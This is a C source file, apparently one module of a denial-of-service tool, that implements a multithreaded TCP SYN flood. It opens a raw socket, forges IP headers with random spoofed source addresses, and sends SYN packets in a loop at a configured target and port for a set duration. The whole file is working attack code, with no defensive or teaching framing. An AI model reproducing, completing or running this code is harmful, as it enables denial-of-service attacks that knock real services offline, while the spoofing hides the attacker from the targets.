#include "../include/elcienco.h"

extern volatile int attack_running;

void *tcp_syn_flood(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    int sock = create_raw_socket();
    if (sock < 0) {
        fprintf(stderr, "[Thread %d] RAW socket failed - need root!\n", data->thread_num);
        free(data);
        return NULL;
    }
    
    int opt = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    
    char packet[MAX_PACKET_SIZE];
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(cfg.port);
    target_addr.sin_addr.s_addr = inet_addr(cfg.target);
    
    time_t start_time = time(NULL);
    unsigned long packets_sent = 0;
    
    printf("[TCP SYN Thread %d] Started against %s:%d\n", 
           data->thread_num, cfg.target, cfg.port);
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        char src_ip[16];
        random_ip(src_ip);
        
        build_tcp_syn_packet(packet, src_ip, cfg.target, rand() % 65535, cfg.port);
        
        struct iphdr *iph = (struct iphdr *)packet;
        sendto(sock, packet, ntohs(iph->tot_len), 0,
               (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        packets_sent++;
    }
    
    printf("[TCP SYN Thread %d] Finished. Packets sent: %lu\n", 
           data->thread_num, packets_sent);
    
    close(sock);
    free(data);
    return NULL;
}
